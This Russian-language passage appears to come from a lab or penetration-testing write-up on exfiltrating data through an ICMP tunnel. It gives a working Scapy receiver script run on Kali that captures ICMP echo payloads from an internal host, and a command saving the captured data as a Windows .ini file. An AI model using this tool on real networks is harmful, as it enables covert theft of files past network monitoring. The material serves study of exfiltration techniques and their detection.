## Утечка через ICMP-туннель

На Kali создан скрипт-приёмник `icmp_receiver.py`:

```python
#!/usr/bin/env python3
import sys
from scapy.all import *

def packet_handler(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        sys.stdout.buffer.write(bytes(pkt[Raw].load))
        sys.stdout.flush()

sniff(filter="icmp and src host 192.168.211.10", prn=packet_handler, store=0)
```

Запуск приёмника с сохранением данных в файл:

```bash
sudo python3 /home/kali/icmp_receiver.py > /home/kali/received_win.ini
```
